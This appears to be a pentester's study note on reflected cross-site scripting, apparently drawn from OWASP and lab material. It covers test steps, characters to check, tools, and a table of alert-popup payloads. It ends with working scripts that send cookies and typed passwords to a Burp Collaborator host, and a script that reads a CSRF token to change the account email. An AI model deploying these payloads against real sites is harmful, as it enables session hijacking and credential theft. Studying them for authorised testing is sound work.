## Reflected
### Summary
In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload. Most common type of XSS. Also referred to as first-order or type 1 XSS by OWASP. The application will pass the unsanitised input to the victim. 

### Requirements
* Attacker injects browser executeable code within a single HTTP response
* Not stored within the application
* Not peristent
* Only affects user who clicks on malicious link
* Attack vector belongs to the URI or HTTP params
* Not processed properly and returned to victim

### Method
1. Attacker creates and tests an offending URI
2. Attacker convinces victim to load this URI
3. Eventual execution of payload on victim browser

### Challenges
* Proper character encoding
  * Sometimes `<script>` might be filtered
  * But `%3cscript%3e` is not
    * `%3c = <`
    * `%3e = >`

### Test objectives
* Identify where a value is reflected into the response
* Assess the input they accept and see if we can't pass around any filters
    * See filter evasion techniques

### How to test
* Detect input vectors
  * Tester must define all user controller variables
    * Includes non obvious ones such as
      * HTTP parameters
      * POST parameters
      * POST data
      * Hidden fields
      * Predefined radio or selection values
* Analysing input vectors
  * Tester will try specifically crafted input vectors for every parameters
    * Example HTML tag attribute context
      * `"><script>alert()</script>`
    * HTML Context
      * `<img src=x onerror=submit()>`
    * https://owasp.org/www-community/xss-filter-evasion-cheatsheet
* Check Impact
  * If attack vector catches from previous attempts
    * Tester will analyse the impact REALISTICALLY
      * Looking for where value is reflected in XSS
      * Tester defines special characters that are not properly encoded, replaced or filtered
      * Often filters work on blacklist principles
      * The set of characters you should test for depends on the context
  * HTML context
    * Test for key HTML entities
      * > (greater than)
      * < (less than)
      * & (ampersand)
      * ' (apostrophe or single quote)
      * " (double quote)
      * Full list: https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references
  * Javascript context
    * \n (new line)
    * \r (carriage return)
    * ' (apostrophe or single quote)
    * " (double quote)
    * \ (backslash)
    * \uXXXX (unicode values)
    * Full list: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#$Using_special_characters_in_strings

### Tools
* PHP Charset Encoder(PCE) - helps you encode arbitrary text to and from 65 kinds of character sets that you can use in your customized payloads. 
* Hackvertor - is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input)
* XSS-Proxy - is an advanced Cross-Site-Scripting (XSS) attack tool.
* ratproxy - is a semi-automated, largely passive web application security audit tool, ooptimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments. 
* Burp Proxy - is an interactive HTTP/S proxy server for attacking and testing web applications. 
* OWASP Zed Attack Proxy (ZAP) - is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.

| Info | Payload |
|:-----|:--------|
`<img src=x onerror=confirm()>`
 `<img src=x onmouseover=confirm()>`
 `%3cimg src=x onmouseover=confirm()%3e`
 %3c
| Basic Hello popup | `http://example.com/search?keyword=<script>alert('Hello')</script>` |
| Basic popup with IP Address of victim | `http://example.com/search?keyword=<script>alert(window.location.hostname)</script>` |
| Basic Alert popup | `<img src=1 onerror=alert(1)>` |
| Basic Print popup | `<img src=1 onerror=print()>` |

### Using Burp Collaborator to steal a cookie example
```java
<script>
fetch('https://cxd5j8xthl0k1lhn5x6ai04n4ea4yt.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script> 
```

### Using Burp Collaborator to capture password example 
```java
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://cxd5j8xthl0k1lhn5x6ai04n4ea4yt.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
### Exploiting XSS to perform CSRF

```java
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>\
```